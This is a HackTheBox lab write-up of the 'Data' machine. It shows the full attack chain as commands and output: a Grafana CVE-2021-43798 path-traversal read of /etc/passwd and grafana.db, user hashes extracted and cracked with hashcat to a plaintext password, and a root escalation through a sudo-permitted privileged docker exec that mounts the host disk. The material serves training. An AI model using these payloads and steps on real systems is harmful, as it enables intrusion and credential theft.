---
title: Machine Data - HackTheBox
date: 2026-02-17 10:00:00 +0100
categories: [HackTheBox]
tags: [Machines, HackTheBox]
---

## Overview
This is the writeup that describes my journey on the Data machine. It's an easy machine with a Grafana service hosted in a Docker container.

- Machine: Data
- Operating System: Linux
- Key vulnerabilities: Grafana LFI, Sensitive file disclosure, Weak password storage, Docker misconfiguration

## Initial Foothold
```bash
┌──(kali㉿kali)-[~/Documents/Machines/Data]
└─$ sudo nmap -sS -sV -sC 10.129.234.47 -oN full_scan.txt -vv
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-17 12:17 -0500
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:17
Completed NSE at 12:17, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:17
Completed NSE at 12:17, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:17
Completed NSE at 12:17, 0.00s elapsed
Initiating Ping Scan at 12:17
Scanning 10.129.234.47 [4 ports]
Completed Ping Scan at 12:17, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:17
Completed Parallel DNS resolution of 1 host. at 12:17, 0.50s elapsed
Initiating SYN Stealth Scan at 12:17
Scanning 10.129.234.47 [1000 ports]
Discovered open port 22/tcp on 10.129.234.47
Discovered open port 3000/tcp on 10.129.234.47
Completed SYN Stealth Scan at 12:17, 1.48s elapsed (1000 total ports)
Initiating Service scan at 12:17
Scanning 2 services on 10.129.234.47
Completed Service scan at 12:17, 6.37s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.234.47.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:17
Completed NSE at 12:17, 3.17s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:17
Completed NSE at 12:17, 0.36s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:17
Completed NSE at 12:17, 0.00s elapsed
Nmap scan report for 10.129.234.47
Host is up, received reset ttl 63 (0.089s latency).
Scanned at 2026-02-17 12:17:08 EST for 11s
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 63:47:0a:81:ad:0f:78:07:46:4b:15:52:4a:4d:1e:39 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzybAIIzY81HLoecDz49RqTD3AAysgQcxH3XoCwJreIo17nJDB1gdyHYQERGigDVgG9hz9uB4AzJc87WXGi7TUM0r16XTLwtEX7MoMgmsXKJX/EoZGQsb1zyFnwQR00xsX2mDvHpaDeUh3EtsL1zAgxLSgi/uym4nLwjTHqpTmm0shwDqlpOvKBbL7IcQ3vVKkmy7o7TG7HYMHiDYF+Aw5BKnOTuVoMgGy3gaFXJqyhszV/6BD9UQALdrtAXKO3bO4D6g5gM9N78Om7kwRvEW3NDwvk5w+gA6wDFpMAigccCaP/JuEPoeqgV3r6cL4PovbbZkxQScY+9SuOGb78EjR
|   256 7d:a9:ac:fa:01:e8:dd:09:90:40:48:ec:dd:f3:08:be (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGUqvSE3W1c40BBItjgG3RCCbsMNpcqRV0DbxMh3qruh0nsNdNm9QuTflzkzqj0nxPoAmjUqq0SolF0UFHqtmEc=
|   256 91:33:2d:1a:81:87:1a:84:d3:b9:0b:23:23:3d:19:4b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPDOwcGGuUmX8fQkvfAdnPuw9tMrPSs4nai8+KMFzpvf
3000/tcp open  http    syn-ack ttl 62 Grafana http
| http-title: Grafana
|_Requested resource was /login
|_http-trane-info: Problem with XML parsing of /evox/about
| http-robots.txt: 1 disallowed entry 
|_/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: C308E3090C62A6425B30B4C38883196B
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:17
Completed NSE at 12:17, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:17
Completed NSE at 12:17, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:17
Completed NSE at 12:17, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.24 seconds
           Raw packets sent: 1004 (44.152KB) | Rcvd: 1001 (40.048KB)
                                                                      
```
The scan reveals 2 ports open:
- 3000: Grafana
- 22: SSH
## Grafana Service
Let's open the Grafana webpage:
![grafana](/assets/img/posts/Data/grafana.png)
Ok, at the end of the page (I've cropped the image :/ ) we can see the version of Grafana: v8.0.0. So, the next step was searching for a CVE and the PoC: [PoC_CVE-2021-43798](https://github.com/monke443/CVE-2021-43798)
and:
```bash
┌──(kali㉿kali)-[~/Documents/Machines/Data/CVE-2021-43798]
└─$ python3 exploit.py --domain 10.129.234.47 --port 3000 
Trying: http://10.129.234.47:3000/public/plugins/alertGroups/../../../../../../../../etc/passwd
Trying: http://10.129.234.47:3000/public/plugins/alertlist/../../../../../../../../etc/passwd
[!] Found LFI
 File to read?  /etc/passwd
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin
```
It works!
Now, before this PoC I found:
[Grafana.db](https://github.com/jas502n/Grafana-CVE-2021-43798)
where a grafana.db file is mentioned. Since it is a .db file, sqlite was needed to open it, so curl was necessary. After analyzing the CVE, we understand how to create a custom payload:
```bash
curl "http://10.129.234.47:3000/public/plugins/<welcome>

```
And here is the complete one:
```bash
┌──(kali㉿kali)-[~/Documents/Machines/Data]
└─$ curl -O "http://10.129.234.47:3000/public/plugins/welcome/../../../../../../../../var/lib/grafana/grafana.db" --path-as-is 
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100 584.0k 100 584.0k   0      0  1.29M      0           
```
## Password recovery
After downloaded the file, let's see what's inside:
```bash
┌──(kali㉿kali)-[~/Documents/Machines/Data]
└─$ sqlite3 grafana.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
alert                       login_attempt             
alert_configuration         migration_log             
alert_instance              org                       
alert_notification          org_user                  
alert_notification_state    playlist                  
alert_rule                  playlist_item             
alert_rule_tag              plugin_setting            
alert_rule_version          preferences               
annotation                  quota                     
annotation_tag              server_lock               
api_key                     session                   
cache_data                  short_url                 
dashboard                   star                      
dashboard_acl               tag                       
dashboard_provisioning      team                      
dashboard_snapshot          team_member               
dashboard_tag               temp_user                 
dashboard_version           test_data                 
data_source                 user                      
library_element             user_auth                 
library_element_connection  user_auth_token           
sqlite> select * from user;
1|0|admin|admin@localhost||7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S|hLLY6QQ4Y6||1|1|0||2022-01-23 12:48:04|2022-01-23 12:48:50|0|2022-01-23 12:48:50|0
2|0|boris|boris@data.vl|boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl|mYl941ma8w||1|0|0||2022-01-23 12:49:11|2022-01-23 12:49:11|0|2012-01-23 12:49:11|0
sqlite> 

```
We have a password but also other fields:
```bash
sqlite> .schema user
CREATE TABLE `user` (
`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL
, `version` INTEGER NOT NULL
, `login` TEXT NOT NULL
, `email` TEXT NOT NULL
, `name` TEXT NULL
, `password` TEXT NULL
, `salt` TEXT NULL
, `rands` TEXT NULL
, `company` TEXT NULL
, `org_id` INTEGER NOT NULL
, `is_admin` INTEGER NOT NULL
, `email_verified` INTEGER NULL
, `theme` TEXT NULL
, `created` DATETIME NOT NULL
, `updated` DATETIME NOT NULL
, `help_flags1` INTEGER NOT NULL DEFAULT 0, `last_seen_at` DATETIME NULL, `is_disabled` INTEGER NOT NULL DEFAULT 0);
CREATE UNIQUE INDEX `UQE_user_login` ON `user` (`login`);
CREATE UNIQUE INDEX `UQE_user_email` ON `user` (`email`);
CREATE INDEX `IDX_user_login_email` ON `user` (`login`,`email`);

```
Oh, the password is salted! Now that we know this, we can use hashcat. After a lot of failures, I understood that the problem was the format I passed to hashcat. In order to get the correct format, I used:
[grafana2hashcat](https://github.com/iamaldi/grafana2hashcat)
so by passing:
```bash
┌──(kali㉿kali)-[~/Documents/Machines/Data/grafana2hashcat]
└─$ cat hashes    
dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8,LCBhdtJWjl
```
to grafana2hashcat was obtained:
 ```bash
┌──(kali㉿kali)-[~/Documents/Machines/Data/grafana2hashcat]
└─$ cat output.txt
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=

```
And by passing that to hashcat:
```bash
┌──(kali㉿kali)-[~/Documents/Machines/Data/grafana2hashcat]
└─$ hashcat -m 10900 output.txt /usr/share/wordlists/rockyou.txt --show                  
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:beautiful1

```
Awesome, we have the password! Now let's use SSH:
```bash
boris@data:~$ ls
user.txt
boris@data:~$ cat user.txt
```
## Privilege Escalation
Let's look for PrivEsc:
```bash
boris@data:~$ sudo -l
Matching Defaults entries for boris on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User boris may run the following commands on localhost:
    (root) NOPASSWD: /snap/bin/docker exec *

```
Mhh okay, boris can run the binary at:
**/snap/bin/docker**. The binary is docker, so basically we can run the exec command of docker to launch a container, but... we don't have any container ID. Since I'm not in a container right now, I can't do anything from there. I found that I can see the hostname from the **/etc/hostname** file, so maybe Grafana is running in a container?
```bash
┌──(kali㉿kali)-[~/Documents/Machines/Data]
└─$ curl -O "http://10.129.3.121:3000/public/plugins/welcome/../../../../../../../../etc/hostname" --path-as-is 

  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100     13 100     13   0      0     71      0                              0

```
And:
```bash
┌──(kali㉿kali)-[~/Documents/Machines/Data]
└─$ cat hostname                                                                                                
e6ff5b1cbc85
```
Awesome!
Let's see now if we have something with mount command:
```bash
boris@data:/snap/bin$ mount
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs (rw,nosuid,relatime,size=1001016k,nr_inodes=250254,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=203120k,mode=755)

/dev/sda1 on / type ext4 (rw,relatime)

securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
cgroup on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=29,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=13832)
mqueue on /dev/mqueue type mqueue (rw,relatime)
debugfs on /sys/kernel/debug type debugfs (rw,relatime)
hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,pagesize=2M)
configfs on /sys/kernel/config type configfs (rw,relatime)
fusectl on /sys/fs/fuse/connections type fusectl (rw,relatime)
/var/lib/snapd/snaps/snapd_14066.snap on /snap/snapd/14066 type squashfs (ro,nodev,relatime,x-gdu.hide)
/var/lib/snapd/snaps/core18_2253.snap on /snap/core18/2253 type squashfs (ro,nodev,relatime,x-gdu.hide)
/var/lib/snapd/snaps/amazon-ssm-agent_4046.snap on /snap/amazon-ssm-agent/4046 type squashfs (ro,nodev,relatime,x-gdu.hide)
/var/lib/snapd/snaps/docker_1125.snap on /snap/docker/1125 type squashfs (ro,nodev,relatime,x-gdu.hide)
binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,relatime)
lxcfs on /var/lib/lxcfs type fuse.lxcfs (rw,nosuid,nodev,relatime,user_id=0,group_id=0,allow_other)
tmpfs on /run/snapd/ns type tmpfs (rw,nosuid,noexec,relatime,size=203120k,mode=755)
nsfs on /run/snapd/ns/docker.mnt type nsfs (rw)
tmpfs on /run/user/1001 type tmpfs (rw,nosuid,nodev,relatime,size=203116k,mode=700,uid=1001,gid=1001)

```

mhh we have something. Let's try to open the container:
```bash
boris@data:~/snap/docker$ sudo /snap/bin/docker exec --privileged -it e6ff5b1cbc85 /bin/bash
bash-5.1$ ls
LICENSE          README.md        bin              plugins-bundled  scripts
NOTICE.md        VERSION          conf             public
bash-5.1$ 

```
and:
```bash
bash-5.1$ mount /dev/sda1 /mnt
mount: permission denied (are you root?)

```
Oh, nope. Let's open it with root:
```bash
boris@data:~/snap/docker$ sudo /snap/bin/docker exec --privileged -it -u root e6ff5b1cbc85 /bin/bash
bash-5.1# mount /dev/sda1 /mnt

```
Great!
```bash
bash-5.1# cd /mnt
bash-5.1# ls
bin             home            lib64           opt             sbin            tmp             vmlinuz.old
boot            initrd.img      lost+found      proc            snap            usr
dev             initrd.img.old  media           root            srv             var
etc             lib             mnt             run             sys             vmlinuz
bash-5.1# cd root
bash-5.1# ls
root.txt  snap
bash-5.1# cat root.txt

```


## Conclusions and Lessons Learned

This machine is a great example of how an apparently "simple" vulnerability (like an LFI on an exposed service) can quickly lead to full compromise, especially when combined with misconfigurations and poor credential management. Key takeaways:

- Never underestimate configuration files and application databases: they often contain credentials or recoverable hashes.
- Pay close attention to user permissions, especially if they can run commands like docker with elevated privileges.
- Automating hash conversion to the correct format for tools like hashcat can save a lot of time.

My advice for anyone tackling this machine is to always think "out of the box" and not stop at the first obstacle: often the solution is within reach, you just need to change your perspective!

![grafana](/assets/img/posts/Data/solved.png)